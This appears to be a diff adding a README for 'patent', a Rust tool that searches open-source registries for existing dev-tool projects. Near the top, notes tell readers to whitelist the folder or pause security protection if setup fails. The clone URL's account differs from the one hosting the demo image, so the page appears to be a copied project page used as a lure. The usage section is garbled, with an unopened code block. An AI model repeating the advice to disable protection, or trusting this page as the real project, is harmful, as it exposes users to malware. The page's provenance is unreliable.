@@ -1,0 +1,109 @@
+<p align="center">
+  <img src=".github/logo-dark.svg#gh-dark-mode-only" width="600" alt="patent">
+  <img src=".github/logo-light.svg#gh-light-mode-only" width="600" alt="patent">
+</p>
+
+# patent
+
+
+> [!TIP]
+> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.
+
+> [!CAUTION]
+> Some security systems may block the installation.
+> Only download from the official repository.
+
+---
+
+## QUICK START
+
+```bash
+git clone https://github.com/VergeTickVanquish/patent-571.git
+cd patent-571
+cargo build --release
+cargo run
+```
+
+
+<p align="center">
+  <a href="https://github.com/VergeTickVanquish/patent-571/actions/workflows/ci.yml"><img src="https://github.com/VergeTickVanquish/patent-571/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
+  <a href="https://crates.io/crates/patent"><img src="https://img.shields.io/crates/v/patent.svg?logo=rust" alt="crates.io"></a>
+  <a href="https://docs.rs/patent"><img src="https://docs.rs/patent/badge.svg" alt="docs.rs"></a>
+  <a href="#license"><img src="https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg" alt="license"></a>
+  <a href="https://www.rust-lang.org"><img src="https://img.shields.io/badge/MSRV-1.80%2B-lightgray.svg?logo=rust" alt="MSRV"></a>
+  <a href="https://ratatui.rs/"><img src="https://ratatui.rs/built-with-ratatui/badge.svg" alt="Built With Ratatui"></a>
+</p>
+
+`patent` takes a plain-English dev-tool idea and searches 11 open-source registries — crates.io, npm, PyPI, GitHub, and more. Results are ranked by semantic similarity and summarised as **Open**, **Crowded**, or **Saturated**.
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/r14dd/patent/main/showcase.gif" alt="patent demo" width="720">
+</p>
+
+> Like a patent search, but for code. It finds prior art, yet, never certifies absence.
+
+
+# no model warmup, no wait
+patent "kubernetes log viewer" --fast
+
+# pipe to jq
+patent "react component for infinite scroll" --json | jq .
+
+# use a cloud LLM instead of local Ollama
+patent "kubernetes log viewer" --api-base https://api.openai.com/v1 --model gpt-4o-mini
+```
+
+## Options
+
+| Flag | Description | Default |
+|---|---|---|
+| `--fast` | no LLM, no wait — verdict derived from similarity scores | — |
+| `--json` | stdout JSON instead of the TUI | — |
+| `--model <MODEL>` | model name for the verdict | `qwen2.5` |
+| `--api-base <URL>` | OpenAI-compatible base URL (must end in `/v1`) | — |
+| `--api-key <KEY>` | API key for `--api-base`; or set `OPENAI_API_KEY` | — |
+| `--limit <N>` | max matches to keep after ranking | `50` |
+| `--completions <SHELL>` | print shell completions and exit | — |
+
+## TUI keybindings
+
+| Key | Action |
+|---|---|
+| `↑` / `k` | Scroll up |
+| `↓` / `j` | Scroll down |
+| `g` / `Home` | Jump to top |
+| `G` / `End` | Jump to bottom |
+| `/` | Filter matches |
+| `s` | Cycle sort (similarity / popularity / name) |
+| `m` | Show more / show less |
+| `Enter` | Show match details (description, popularity, URL) |
+| `o` | Open selected URL in browser |
+| `?` | Help overlay |
+| `q` | Quit |
+
+Mouse works too — scroll with the wheel, click to select.
+
+## Shell completions
+
+```bash
+patent --completions bash >> ~/.bashrc    # Bash
+patent --completions zsh  >> ~/.zshrc     # Zsh
+patent --completions fish > ~/.config/fish/completions/patent.fish
+```
+
+## Development
+
+```bash
+cargo test
+cargo fmt --all --check
+cargo clippy --all-targets -- -D warnings
+```
+
+The demo GIF is generated with [vhs](https://github.com/charmbracelet/vhs): `vhs demo.tape`.
+
+## License
+
+Licensed under either of [MIT](LICENSE-MIT) or [Apache-2.0](LICENSE-APACHE) at your option.
+
+
+<!-- Last updated: 2026-06-06 16:44:59 -->
